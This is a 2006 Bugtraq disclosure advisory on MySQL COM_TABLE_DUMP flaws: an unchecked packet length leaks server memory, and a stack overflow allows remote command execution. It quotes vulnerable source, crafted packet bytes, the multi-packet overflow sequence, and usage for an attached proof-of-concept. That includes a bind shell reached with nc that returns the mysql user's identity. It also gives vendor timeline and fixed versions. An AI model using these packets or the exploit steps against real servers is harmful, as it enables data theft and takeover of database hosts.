@@ -1,0 +1,290 @@
+
+Date: Tue, 02 May 2006 15:40:57 +0200
+From: Stefano Di Paola <stefano.dipaola@...ec.it>
+To: Bugtraq <bugtraq@...urityfocus.com>,
+	vulnwatch <vulnwatch@...nwatch.org>
+Subject: MySQL  COM_TABLE_DUMP Information Leakage and Arbitrary command
+	execution.
+
+~.oOOo.   MySQL COM_TABLE_DUMP  .oOOo.~
+
+Information Leakage and Arbitrary command execution 
+==============================
+
+- Summary:
+
+MySQL Server  has an  information leakage flaw, if a malicious client 
+sends a specific forged packet.
+Moreover some particular input can crash the server by
+overwriting the stack, which could lead to remote server compromise.
+
+
+.The information Leakage (<=5.0.20, <= 4.0.26, <= 4.1.18, <= 5.1.?)- 
+
+Abstract:
+An authenticated user could read random memory from MySQL server, by
+taking advantage of a non checked packet length.
+
+
+.The server compromise (<=5.0.20 - yes, only 5.x branch - 5.1.x not
+tested) - 
+
+Abstract: 
+An authenticated user could remotely execute arbitrary commands by
+taking advantage of a stack overflow.
+
+
+A Proof of Concept is Attached for all these issues.
+Tested on: Debian 3.1 - IA32.
+
+A little Note:
+To take advantage of these flaws an attacker should have direct access
+to MySQL server communication layer (port 3306 or unix socket).
+But if used in conjuction with some web application flaws 
+(i.e. php code injection) an attacker could use socket programming
+(i.e. php sockets) to gain access to that layer.
+
+====================================================
+
+== Description - The COM_TABLE_DUMP Information Leakage:
+
+Author: Stefano Di Paola
+Vulnerable: Mysql <= 4.0.26, 4.1.18,5.0.20
+Type of Vulnerability: Local/Remote - Information Leakage
+Tested On :  Debian 3.1 - IA32.
+Vendor Status: Notified on April, 25th 2006, Confirmed on April, 26th
+2006, New versions released on 2nd May 2006.  
+Fixed: Update to 4.0.27, 4.1.19, 5.0.21, 5.1.10 versions.
+
+
+COM_TABLE_DUMP, as described in MySQL manual is
+"used by slave server to get master table"
+
+A deep look on it shows that MySQL server waits for a forged packet
+in the following way:
+
+packlen  ,0x00  ,0x00  ,0x00  ,COM_TABLE_DUMP(0x13) 
+
+and then:
+
+  dblen, db_name , tbllen , tblname
+
+
+the extracted code is:
+sql/sql_parse.cc: line: ~1589 
+
+  case COM_TABLE_DUMP:
+  {
+    char *db, *tbl_name;
+    uint db_len= *(uchar*) packet;
+    uint tbl_len= *(uchar*) (packet + db_len + 1); 
+   
+    statistic_increment(thd->status_var.com_other, &LOCK_status);
+    thd->enable_slow_log= opt_log_slow_admin_statements;
+    db= thd->alloc(db_len + tbl_len + 2);
+    if (!db)
+    {
+      my_message(ER_OUT_OF_RESOURCES, ER(ER_OUT_OF_RESOURCES), MYF(0));
+      break;
+    }
+    tbl_name= strmake(db, packet + 1, db_len)+1;
+    strmake(tbl_name, packet + db_len + 2, tbl_len);
+
+    mysql_table_dump(thd, db, tbl_name, -1);
+    break;
+
+  }
+
+
+Packet should be something like this:
+03  00  00  00  13  1  73 2f 1 74
+
+to ask for table 't' on db 's'.
+
+But as you can see there is no check for packet, so
+if we craft a packet like this:
+
+03  00  00  00  13  len  73
+
+we will get an error response 
+
+like this:
+z^D#42S02Table 's.^D#42S02Table 's.z^D#42S02Table 's.' doesn't
+exist'NULL'' doesn't ' doesn't exist
+
+depending on len value and memory content.
+
+what happens?
+Here:
+tbl_len = *(uchar*) (packet + db_len + 1);
+
+takes some value beyond packet len and then with:
+
+strmake(tbl_name, packet + db_len + 2, tbl_len);
+
+memory content is copied by tbl_len in tbl_name or until it find a
+'\0'  
+
+so when this random name is not found Server will send back an error
+with some random internal memory content.
+
+This, of course can expose parts of queries and or response executed by
+some previously logged user.
+
+The Vendor fix:
+
+bugs are fixed in 4.0.27, 4.1.19, 5.0.21, 5.1.10.
+
+
+====================================================
+
+- Description - The COM_TABLE_DUMP server compromise:
+
+Author: Stefano Di Paola
+Vulnerable: Mysql <= 5.0.20 - yes, only 5.x branch
+Type of Vulnerability: Local/Remote - Input Validation - Server
+compromise
+Tested On :  Debian 3.1 - IA32.
+Vendor Status:  Notified on April, 25th 2006, Confirmed on April, 26th
+2006, New versions released on 2nd May 2006.
+Fixed: Update to 4.0.27, 4.1.19, 5.0.21, 5.1.10 versions.
+
+With the same previous vulnerability, a malicious (authenticated) user
+could remotely execute arbitrary commands.
+
+Let's see how:
+
+On sql/sql_base.cc line: ~1090:
+
+TABLE *open_table(THD *thd, TABLE_LIST *table_list, MEM_ROOT *mem_root,
+                  bool *refresh, uint flags)
+{
+  reg1  TABLE *table;
+  char  key[MAX_DBKEY_LENGTH];
+  uint  key_length;
+  char  *alias= table_list->alias;
+  HASH_SEARCH_STATE state;
+  DBUG_ENTER("open_table");
+  DBUG_PRINT("info", ("table_list:%x  thd:%x %s",
+table_list,thd,table_list->alias));
+  /* find a unused table in the open table cache */
+  if (refresh)
+    *refresh=0;
+
+  /* an open table operation needs a lot of the stack space */
+  if (check_stack_overrun(thd, STACK_MIN_SIZE_FOR_OPEN, (char *)&alias))
+    return 0;
+
+  if (thd->killed)
+    DBUG_RETURN(0);
+  key_length= (uint) (strmov(strmov(key, table_list->db)+1,
+                             table_list->table_name)-key)+1;
+  int4store(key + key_length, thd->server_id);
+  int4store(key + key_length + 4, thd->variables.pseudo_thread_id);
+
+
+By sending a triple of commands,
+
+1. A select with the payload.
+
+2-3. Two COM_TABLE_DUMP packets:
+
+0x03,  0x00,  0x00,  0x00,  0x13,  0x02 , 0x73 
+
+that is db_len=2 and tbl_len is a memory value beyond the packet,
+
+the two 'strmov' will, as the third COM_TABLE_DUMP packet is received by
+the server, overwrite a lot of memory, and a good part of the stack
+too...
+
+The rest is kind of hacking to get the stack be aligned for jumping to
+the right address..
+so i won't go deep in this technique (a lot of gdb helped very much).
+
+
+To get this exploit work we need to know one address:
+
+the thread struct address (thd).
+
+We should know table_list address too, but i found mine is always
+0x1f548 far from thd,so is automatically computed.
+
+We need these address, because they are overwrited too, and the
+shellcode depends by 
+table_list->alias address.
+
+Of course there will be more sofisticated approaches,
+but, hey, this was done as a Poc not as a ready run-n-crack 
+program for kiddies. :)
+
+
+The Vendor fix:
+
+bugs are fixed in 4.0.27, 4.1.19, 5.0.21, 5.1.10.
+
+You can download them on http://dev.mysql.com/downloads/
+
+
+============
+
+==COM_TABLE_DUMP poc : 
+
+my_com_table_dump_exploit.c
+
+You can compile :
+
+gcc -Imysql-5.0.20-src/include/ my_com_table_dump_exploit.c
+-Lmysql-5.0.20/lib/mysql/
+-lmysqlclient -o  my_exploit
+
+and then
+
+my_exploit [-H] [-i] [-t 0xtable-address] [-a 0xthread-address] [[-s
+socket]|[-h host][-p port]][-x]
+
+-H: this Help;
+-i: Information leakage exploit (shows the content of MySql Server
+Memory)
+-x: shows c/s communication output in hexadecimal
+-t: hexadecimal table_list struct address (by default we try to find it
+automatically)
+-a: hexadecimal thread struct address (look at the error log to see
+something like: thd=0x8b1b338)
+-u: mysql username (anonymous too ;)
+-p: mysql userpass (if you need it)
+-s: the socket path if is a unix socket
+-h: hostname or IP address
+-P: port (default 3306)
+
+
+Example_1 - Information leakage: 
+
+my_exploit  -s socketpath -u username -i 
+
+Example_2 - Remote Shell on port 2707: 
+
+my_exploit -h 127.0.0.1 -u username -a 0x8b1f468
+
+and then on another shell
+
+$ nc 127.0.0.1 2707
+id
+uid=78(mysql) gid=78(mysql) groups=78(mysql)
+^D
+$
+
+
+Regards,
+Stefano
+
+-- 
+
+......---oOOo--------oOOo---......
+Stefano Di Paola
+Software Engineer
+Email: stefano.dipaola_at_wisec.it
+Email: stefano.dipaola1_at_tin.it
+Web: www.wisec.it
+..................................
+
+View attachment "my_com_table_dump_exploit.c" of type "text/x-csrc" (11459 bytes)
